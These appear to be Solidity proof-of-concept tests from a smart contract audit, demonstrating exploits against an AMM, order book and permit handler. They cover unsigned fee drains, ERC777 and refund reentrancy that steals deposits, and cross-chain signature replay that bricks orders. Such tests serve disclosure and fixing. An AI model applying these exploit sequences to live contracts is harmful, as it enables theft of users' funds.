function test_feeOnTopUnsignedPermitDrain_FoK() public {
    // Setup: user signs a FoK permit for 1000 USDC input swap, no hook
    uint256 userAmount = 1000e6;
    address attacker = makeAddr("attacker");
    deal(address(usdc), user, userAmount);
    vm.prank(user);
    usdc.approve(address(permitC), userAmount);

    // User signs permit with amountSpecified=+userAmount, feeOnTop NOT in signature
    (uint8 v, bytes32 r, bytes32 s) = _signFoKPermit(user, userAmount, swapOrder);

    // Attacker executes with feeOnTop.amount=999e6, feeOnTop.recipient=attacker
    FlatFeeWithRecipient memory feeOnTop = FlatFeeWithRecipient({
        amount: 999e6, recipient: attacker
    });
    bytes memory transferExtraData = abi.encodePacked(
        FILL_OR_KILL_PERMIT,
        abi.encode(FillOrKillPermitTransfer({
            permitProcessor: address(permitC), from: user, nonce: 0,
            permitAmount: userAmount, expiration: block.timestamp + 1 hours,
            signature: abi.encodePacked(r, s, v),
            cosigner: address(0), cosignatureExpiration: 0,
            cosignature: "", hook: address(0), hookData: ""
        }))
    );
    vm.prank(attacker);
    amm.swapByInput(swapOrder, exchangeFee, feeOnTop, abi.encodePacked(address(permitHandler), transferExtraData));

    // Assert: attacker got 999 USDC, user got dust output
    assertGe(usdc.balanceOf(attacker), 999e6);
    assertLt(tokenOut.balanceOf(user), dustThreshold);
}

function test_partialFillFeeOnTopOvercharge() public {
    // User signs partial fill: want 100e18 tokenOut, max input 110e18
    // Pool rate: 5e18 tokenIn -> 100e18 tokenOut
    address attacker = makeAddr("attacker");
    int256 permitAmountSpecified = -100e18;
    uint256 permitLimitAmount    = 110e18;

    bytes memory sig = _signPartialFillPermit(user, permitAmountSpecified, permitLimitAmount);

    // Attacker sets feeOnTop=105e18 — leaves only 5e18 for the pool
    FlatFeeWithRecipient memory feeOnTop = FlatFeeWithRecipient({
        amount: 105e18, recipient: attacker
    });

    vm.prank(attacker);
    amm.swapByOutput(swapOrder, exchangeFee, feeOnTop, transferData);

    // amountIn check: 5+105=110 <= 110*100/100=110 passes
    assertEq(tokenOut.balanceOf(user), 100e18,  "user received correct output");
    assertGe(tokenIn.balanceOf(attacker), 105e18, "attacker drained 95% via unsigned feeOnTop");
}

function test_clobOptimisticBalanceDrain_ERC777() public {
    // Pre-condition: Alice deposits 100e18 tokenOut into CLOB
    vm.startPrank(alice);
    tokenOut.transfer(address(clob), 100e18);
    clob.depositToken(address(tokenOut), 100e18);
    vm.stopPrank();

    // Attacker opens sell order: 50 tokenIn_ERC777 -> 50 tokenOut at 1:1
    vm.prank(attacker);
    tokenIn_ERC777.transfer(address(clob), 50e18);
    vm.prank(attacker);
    clob.openOrder(address(tokenIn_ERC777), address(tokenOut), sqrtPrice_1to1, 50e18, groupKey, 0, hookData);

    // MaliciousReceiver: on tokensReceived, calls clob.withdrawToken(tokenOut, 50e18)
    MaliciousERC777Receiver malicious = new MaliciousERC777Receiver(address(clob), address(tokenOut), 50e18);

    // Execute swap: feeOnTop.recipient = malicious, triggers ERC777 hook
    // Hook fires BEFORE AMM sends tokenOut to CLOB (line 2227 < 2239)
    FlatFeeWithRecipient memory feeOnTop = FlatFeeWithRecipient({amount: 30e18, recipient: address(malicious)});
    vm.prank(executor);
    amm.swapByInput(swapOrder, exchangeFee, feeOnTop,
        abi.encodePacked(address(clob), fillParams));

    // Malicious receiver drained 50e18 of Alice's tokenOut during the callback
    // CLOB received 50e18 tokenOut from AMM *after* drain, net short 50e18
    assertLt(tokenOut.balanceOf(address(clob)), 100e18, "CLOB is insolvent");
    assertEq(tokenOut.balanceOf(address(malicious)), 50e18, "attacker drained Alice");
    // Alice can no longer withdraw her full deposit
    vm.prank(alice);
    vm.expectRevert();
    clob.withdrawToken(address(tokenOut), 100e18);
}

function test_destroyCosignerCrossChainReplay() public {
    address cosigner = makeAddr("cosigner");

    // Cosigner signs CosignerDestruct for chain 1 (mainnet)
    vm.chainId(1);
    bytes32 digest_mainnet = permitHandler.exposed_hashUniversalTypedDataV4(
        keccak256(abi.encode(COSIGNER_SELF_DESTRUCT_TYPEHASH, cosigner))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(cosignerKey, digest_mainnet);
    bytes memory sig = abi.encodePacked(r, s, v);

    // Original destruction on mainnet
    permitHandler_mainnet.destroyCosigner(cosigner, sig);
    assertTrue(permitHandler_mainnet.destroyedCosigners(cosigner));

    // Attacker replays SAME sig on Base (chainId=8453)
    // Because _hashUniversalTypedDataV4 omits chainId, digest is identical
    vm.chainId(8453);
    permitHandler_base.destroyCosigner(cosigner, sig); // succeeds!
    assertTrue(permitHandler_base.destroyedCosigners(cosigner), "cross-chain replay succeeded");

    // All Base orders referencing cosigner are now permanently bricked
    vm.expectRevert(PermitTransferHandler__CosignerDestroyed.selector);
    permitHandler_base.ammHandleTransfer(executor, swapOrder, amountIn, amountOut,
        exchangeFee, feeOnTop, permitDataWithCosigner);
}

function test_afterSwapRefundReentrancy_flashLoanFree() public {
    // Executor is also a maker with 50e18 tokenOut filled in the swap
    MaliciousExecutorMaker attacker = new MaliciousExecutorMaker(address(clob), address(tokenOut));
    deal(address(tokenIn), address(attacker), 100e18);
    vm.prank(address(attacker));
    clob.depositToken(address(tokenIn), 50e18);
    vm.prank(address(attacker));
    // Open order to sell tokenIn for WNATIVE
    clob.openOrder(address(tokenIn), WRAPPED_NATIVE, sqrtPrice, 50e18, groupKey, 0, hookData);

    // Setup: swap produces fillOutputRemaining in WNATIVE (some orders not fully filled)
    // afterSwapRefund -> withdrawToAccount -> attacker.receive() fires
    // Inside receive(): attacker calls clob.withdrawToken(WNATIVE, 50e18)
    uint256 wethBefore = weth.balanceOf(address(attacker));
    vm.prank(address(attacker));
    amm.swapByInput(swapOrder_wNative, exchangeFee, zeroFeeOnTop,
        abi.encodePacked(address(clob), fillParams));

    // Attacker withdrew 50e18 WNATIVE during the callback (filled balance)
    // AND received fillOutputRemaining WNATIVE from afterSwapRefund
    // Total = filled + refund, all in one transaction, zero flash loan cost
    assertGe(weth.balanceOf(address(attacker)) - wethBefore, 50e18, "reentrancy granted early withdrawal");
    assertEq(clob.makerTokenBalance(WRAPPED_NATIVE, address(attacker)), 0);
}
